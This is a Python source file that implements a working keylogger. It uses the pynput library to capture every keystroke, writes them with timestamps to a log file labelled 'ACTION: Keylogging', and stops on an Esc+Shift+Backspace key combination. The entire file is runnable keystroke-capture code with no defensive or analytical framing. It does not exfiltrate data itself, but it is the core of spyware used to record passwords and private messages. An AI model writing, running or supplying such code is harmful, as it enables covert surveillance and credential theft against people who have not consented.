import datetime
import sys
from log import custom_path
from pynput import keyboard


def keylogger():
    # Number of keys pressed
    count = 0
    # The currently active modifiers
    current = set()
    # Number of hashtags to display in the logs.txt file
    HASHTAGS = 100
    # Special keys to be ignored in the logs.txt file
    SPECIALS = [
        keyboard.Key.space, keyboard.Key.enter,
        keyboard.Key.backspace, keyboard.Key.cmd,
        keyboard.Key.esc, keyboard.Key.shift,
        keyboard.Key.caps_lock
    ]
    # The key combination to check for termination
    COMBINATION = {
        keyboard.Key.esc, keyboard.Key.shift,
        keyboard.Key.backspace
    }

    try:
        f = open(custom_path.get_path(), 'w')
        f.write('#' * HASHTAGS + '\n')
        f.write(f'DATE_CREATED: {datetime.datetime.now().strftime("%Y-%m-%d %X")}\n')
        f.write('ACTION: Keylogging\n')
        f.write('#' * HASHTAGS + '\n')
        f.write('\n' * 2)
        f.write('#' * HASHTAGS + '\n')
        f.write('CAPTURED_KEYSTROKES:\n\n')
        f.write(f'{datetime.datetime.now().strftime("%Y-%m-%d %X")}: ')
    except OSError:
        print('Add a filename to the path, and try again.\n:(')
        sys.exit(0)
    except Exception:
        print('Something went wrong during the operation.')
        sys.exit(0)

    def stop(key):
        if key in COMBINATION:
            current.add(key)
            if all(k in current for k in COMBINATION):
                f.write('\n')
                f.write('#' * HASHTAGS)
                f.close()
                return False

    # Prettifies the logs in the text file
    def plogs(key, date):
        nonlocal count
        count += 1
        if key == keyboard.Key.space:
            f.write(' ')
        if key == keyboard.Key.enter:
            f.write('\n')
            f.write(f'{date}: ')
        if count == 80:
            f.write('\n')
            count = 0
        if key not in SPECIALS:
            f.write(str(key).replace("'", ""))

    def on_press(key):
        date = datetime.datetime.now().strftime('%Y-%m-%d %X')
        plogs(key, date)

    def on_release(key):
        return stop(key)

    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
